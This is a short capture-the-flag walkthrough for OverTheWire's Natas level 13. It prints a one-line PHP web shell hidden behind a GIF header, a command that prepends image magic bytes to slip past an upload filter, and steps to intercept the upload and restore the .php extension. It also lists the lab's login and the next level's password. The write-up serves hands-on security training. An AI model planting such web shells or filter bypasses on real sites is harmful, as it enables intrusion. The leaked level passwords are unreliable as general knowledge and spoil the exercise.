# Natas13 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas13
Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
URL:      http://natas13.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.
- This is pretty much the same level as natas12 just with more sanitization, so we will do a GIF shell here.

  ```
  $ cat gifshell.php          
  GIF87a<?php echo shell_exec($_GET['cmd']); ?>
  ```
  
- Before uploading a shell, we need to add magic bytes.

  ```
  (echo -n -e '\xff\xd8\xff\xee'; cat gifshell.php) > gifshell2.php
  ```

- Same as for the last level, upload a shell (in my case `gifshell2.php`), intercept the request, and change extension back to `.php`.

- You will get a link to your shell, go there.

  <img src=""/>

- Don't get confused here, everything is working fine so execute the same command from the last level in order to read the password.

  <img src=""/>

---

## 🏁 Password for the next level

`natas14 password is z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
